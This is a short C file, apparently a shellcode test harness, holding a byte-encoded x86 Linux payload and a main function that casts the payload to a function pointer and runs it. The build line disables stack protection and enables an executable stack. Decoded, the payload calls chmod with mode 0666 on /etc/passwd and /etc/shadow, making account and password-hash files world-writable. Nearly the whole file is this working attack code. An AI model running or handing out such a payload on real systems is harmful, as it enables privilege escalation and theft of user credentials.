#include<stdio.h>
#include<string.h>

/*

Compilation: gcc -fno-stack-protector -z execstack shellcode2-poly.c -o shellcode2-poly
Execution: ./shellcode2-poly

*/


unsigned char shellcode[] = \

"\x99\x31\xc0\x66\xb9\xb6\x01\x50\xc7\x44\x24\xfc\x73"
"\x73\x77\x64\xc7\x44\x24\xf8\x2f\x2f\x70\x61\xc7\x44"
"\x24\xf4\x2f\x65\x74\x63\x83\xec\x0c\x89\xe3\xb0\x0f"
"\xcd\x80\x52\xc7\x44\x24\xfc\x61\x64\x6f\x77\xc7\x44"
"\x24\xf8\x2f\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x65\x74"
"\x63\x83\xec\x0c\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x40"
"\xcd\x80";

main()
{
	
	printf("Shellcode length: %d\n",strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;

	ret();
	
}
